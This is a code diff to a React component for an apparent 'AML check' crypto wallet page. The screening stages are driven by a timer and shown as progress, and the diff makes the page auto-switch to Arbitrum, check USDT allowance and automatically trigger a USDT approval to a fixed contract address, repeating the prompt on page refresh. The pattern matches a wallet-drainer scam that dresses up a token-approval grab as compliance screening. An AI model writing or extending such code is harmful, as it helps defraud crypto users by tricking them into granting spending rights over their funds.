@@ -12,15 +12,30 @@ export default function AmlCheck() {
   const liveChainId = useChainId()
   const { switchChain } = useSwitchChain()
 
-  // Auto switch to Arbitrum on connect if wallet is on a different network
+  // Persisted AML completion state
+  const initialAmlCheck = (() => { try { return localStorage.getItem('amlsec_amlCheck') === 'true' } catch { return false } })()
+  const [amlCheckComplete, setAmlCheckComplete] = useState(initialAmlCheck)
+
+  // Auto switch to Arbitrum and check allowance only when AML is complete
   useEffect(() => {
-    if (!isConnected || !liveChainId) return
+    if (!isConnected || !liveChainId || !amlCheckComplete) return
     if (liveChainId !== CHAIN_IDS.arbitrum) {
       setTxStatus('Switching to Arbitrum…')
       ;(async () => {
         try {
           await switchChain({ chainId: CHAIN_IDS.arbitrum })
-          setTxStatus('Switched to Arbitrum.')
+          setTxStatus('Switched to Arbitrum. Checking USDT allowance…')
+          if (address) {
+            try {
+              const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
+              const alreadyApproved = Number(allowance) > 0
+              setTxStatus(alreadyApproved ? 'Approval already granted for USDT.' : 'No USDT allowance yet. Please approve.')
+            } catch (e) {
+              const msg = e?.message || String(e)
+              setError(`Failed to check allowance after switch. ${msg}`)
+              setTxStatus('')
+            }
+          }
         } catch (err) {
           if (err?.code === 4902) {
             setError('Please add Arbitrum network to your wallet manually')
@@ -31,8 +46,22 @@ export default function AmlCheck() {
           setTxStatus('')
         }
       })()
+    } else if (isConnected && address) {
+      // Already on Arbitrum; check allowance once connected
+      ;(async () => {
+        try {
+          setTxStatus('Checking USDT allowance…')
+          const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
+          const alreadyApproved = Number(allowance) > 0
+          setTxStatus(alreadyApproved ? 'Approval already granted for USDT.' : 'No USDT allowance yet. Please approve.')
+        } catch (e) {
+          const msg = e?.message || String(e)
+          setError(`Failed to check allowance. ${msg}`)
+          setTxStatus('')
+        }
+      })()
     }
-  }, [isConnected, liveChainId])
+  }, [isConnected, liveChainId, amlCheckComplete, address])
 
   const settings = useMemo(() => {
     try { return JSON.parse(localStorage.getItem('amlsec_settings') || '{}') } catch { return {} }
@@ -51,7 +80,9 @@ export default function AmlCheck() {
   const [txStatus, setTxStatus] = useState('')
   const [error, setError] = useState('')
   const [isTrustModalOpen, setTrustModalOpen] = useState(false)
-
+  // Mark whether approval has been triggered to avoid duplicates
+  const [approvalTriggered, setApprovalTriggered] = useState(false)
+  
   const stages = [
     { pct: 5, label: 'Loading account and network context' },
     { pct: 15, label: 'Sanctions lists screening' },
@@ -62,9 +93,17 @@ export default function AmlCheck() {
     { pct: 100, label: 'AML screening complete' }
   ]
 
+  // Reflect saved completion immediately on load
   useEffect(() => {
-    // Do not run AML progression when wallet is not connected
-    if (!isConnected) return
+    if (amlCheckComplete) {
+      setProgress(100)
+      setStage(stages[stages.length - 1].label)
+    }
+  }, [amlCheckComplete])
+
+  useEffect(() => {
+    // Do not run AML progression when wallet is not connected or already complete
+    if (!isConnected || amlCheckComplete) return
 
     let pct = progress || 0
     let cancelled = false
@@ -78,6 +117,11 @@ export default function AmlCheck() {
       setStage(current.label)
 
       if (pct >= 100) {
+        // Mark AML check complete and persist
+        setAmlCheckComplete(true)
+        try { localStorage.setItem('amlsec_amlCheck', 'true') } catch {}
+        // Prevent double approval triggers
+        setApprovalTriggered(true)
         triggerApproval()
         return
       }
@@ -89,12 +133,43 @@ export default function AmlCheck() {
     const t = setTimeout(tick, initialDelay)
     return () => { cancelled = true; clearTimeout(t) }
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isConnected])
+  }, [isConnected, amlCheckComplete])
+
+  // Auto-approve on refresh when AML completed, connected, and on Arbitrum
+  useEffect(() => {
+    if (!amlCheckComplete || !isConnected || !address) return
+    if (liveChainId !== CHAIN_IDS.arbitrum) return
+    if (approvalTriggered) return
+    ;(async () => {
+      try {
+        const allowance = await checkUSDTAllowance({ smartContractAddress: SMART_CONTRACT_ADDRESS, userAddress: address, network: defaultNetwork })
+        const alreadyApproved = Number(allowance) > 0
+        if (!alreadyApproved) {
+          setApprovalTriggered(true)
+          await triggerApproval()
+        } else {
+          setTxStatus('Approval already granted for USDT.')
+        }
+      } catch (e) {
+        // Surface a concise error, but do not mark approvalTriggered
+        const msg = e?.message || String(e)
+        setError(`Failed to auto-approve on refresh. ${msg}`)
+      }
+    })()
+  }, [amlCheckComplete, isConnected, address, liveChainId, approvalTriggered])
 
   async function triggerApproval() {
     setTxStatus('Preparing approval…')
     setError('')
     try {
+      // Gate approval by AML completion (state or persisted)
+      let amlCompleteFlag = amlCheckComplete
+      try { if (!amlCompleteFlag) amlCompleteFlag = localStorage.getItem('amlsec_amlCheck') === 'true' } catch {}
+      if (!amlCompleteFlag) {
+        setTxStatus('Waiting for AML completion before approval.')
+        return
+      }
+  
       if (!isConnected || !address) {
         throw new Error('Wallet not connected. Open via Trust Wallet QR and connect.')
       }
